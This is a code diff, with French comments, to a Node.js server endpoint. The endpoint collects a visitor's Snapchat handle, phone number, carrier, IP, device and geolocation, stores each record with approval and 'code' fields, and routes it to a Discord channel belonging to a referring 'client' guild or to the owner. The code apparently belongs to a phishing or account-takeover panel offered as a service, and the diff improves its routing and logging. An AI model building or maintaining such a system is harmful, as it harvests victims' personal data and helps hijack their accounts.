@@ -419,14 +419,17 @@ app.post('/api/submit', async (req, res) => {
     const id = uuidv4();
     const geoStr = geo ? `${geo.flag} ${geo.city}, ${geo.country}` : '?';
     const ispStr = geo ? geo.isp : '?';
-    // Valider le ref (guild ID) — doit avoir premium + channel configuré
-    const refGuildId = (ref && cfg.guild_channels && cfg.guild_channels[ref]) ? ref : null;
+    // Valider le ref (guild ID) — doit avoir un channel configuré
+    const refChannelId = ref && cfg.guild_channels ? cfg.guild_channels[String(ref)] : null;
+    const refGuildId   = refChannelId ? String(ref) : null;
+    console.log(`[SUBMIT] ref=${ref} | guild_channels keys=${Object.keys(cfg.guild_channels||{}).join(',')} | refChannelId=${refChannelId} | routing=${refGuildId ? 'CLIENT' : 'OWNER'}`);
 
     const requestData = {
         snapchat, phone, operator, ip, device, os, geo: geoStr, isp: ispStr,
         approved: false, rejected: false, code: null,
         createdAt: Date.now(),
-        refGuildId: refGuildId || null,
+        refGuildId:   refGuildId   || null,
+        refChannelId: refChannelId || null,
     };
     requests.set(id, requestData);
     saveRequests(requests);
@@ -479,10 +482,9 @@ app.post('/api/submit', async (req, res) => {
 
     // Envoi Discord asynchrone (ne bloque plus la réponse HTTP)
     const sendDiscordAsync = async () => {
-        // Routing : si ref valide → channel du client, sinon → channel owner
-        const targetChannelId = refGuildId
-            ? cfg.guild_channels[refGuildId]
-            : APPROVAL_CHANNEL_ID;
+        // Routing : si ref valide → channel du client (capturé à la soumission), sinon → channel owner
+        const targetChannelId = refChannelId || APPROVAL_CHANNEL_ID;
+        console.log(`[DISCORD] Envoi vers channel ${targetChannelId} (${refGuildId ? 'client' : 'owner'})`);
 
         const mainChannel     = client.channels.cache.get(targetChannelId);
         const priorityChannel = (!refGuildId && cfg.salon_prioritaire) ? client.channels.cache.get(PRIORITY_CHANNEL_ID) : null;
